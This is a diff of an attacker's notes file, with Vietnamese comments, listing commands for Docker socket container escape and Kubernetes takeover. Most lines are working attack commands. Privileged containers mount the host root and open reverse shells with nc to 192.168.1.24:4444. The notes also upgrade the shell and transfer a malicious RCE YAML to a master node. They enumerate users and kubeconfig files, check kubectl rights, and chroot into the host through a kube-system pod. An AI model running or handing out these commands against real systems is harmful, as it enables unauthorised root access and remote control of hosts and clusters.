@@ -93,8 +93,11 @@ curl --unix-socket /run/docker.sock http://localhost/containers/json 	# kiểm t
 
 #RCE hiệu quả
 ;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "mkfifo /tmp/p; cat /tmp/p | sh 2>&1 | nc 192.168.1.24 4444 > /tmp/p" 
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "busybox nc 192.168.1.24 4444 -e /bin/sh"
 
-;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged -v /:/host --network=host ubuntu sh -c "apt update && apt install -y netcat-openbsd && rm -f /tmp/p && mkfifo /tmp/p && cat /tmp/p | /bin/bash -i 2>&1 | nc 192.168.1.24 4444 > /tmp/p"
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged -v /:/host --network=host alpine sh -c "apk update && apk add netcat-traditional bash && nc -e /bin/sh 192.168.1.24 4444"
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -it --rm --privileged   -v /:/host --network=host alpine    sh -c "nc 192.168.1.24 4444 -e /bin/sh"
+
 
 hostname -I 	# hiển thị IP của container
 nc 192.168.127.208 4444 -e /bin/sh 	#RCE
@@ -121,3 +124,15 @@ kubectl exec -it -n kube-system rce-daemon-mdg5j -- chroot /host /bin/bash 		#RC
 
 python3 -c 'import pty; pty.spawn("/bin/bash")' 					# upgrade shell
 script /dev/null -c bash
+
+
+# Worker to master
+ Get-Content RCE-master.yaml | ncat.exe 192.168.1.3 4444 			# Gui file qua worker de exploit
+nc -lvp 4444 > RCE.yaml 							# Nhan file qua window va luu vs en RCE.yaml
+cat /etc/passwd | cut -d: -f1							# kiem tra tat ca user tren may
+find /home -name "config" -path "*/.kube/config" 2>/dev/null			# tim user nao co fule .kube -> nguoi dung su ung duoc kubetl
+sudo -u vagrant kubectl auth can-i '*' '*' --all-namespaces			# kiem tra xem user do co quyen truy cap toan bo kubectl khong
+getent group sudo								# kiem tra nguoi dung co quyen sudo
+kubectl get pods -n kube-system -o wide						# kiem tra xem pods minh cai vao chay tren master co ID bao nhieu
+kubectl exec -i -n kube-system rce-daemon-mdg5j  -- chroot /host /bin/bash	# chay shell cua pod do voi lenh chroot /host /bin/bash de vao root cua master
+
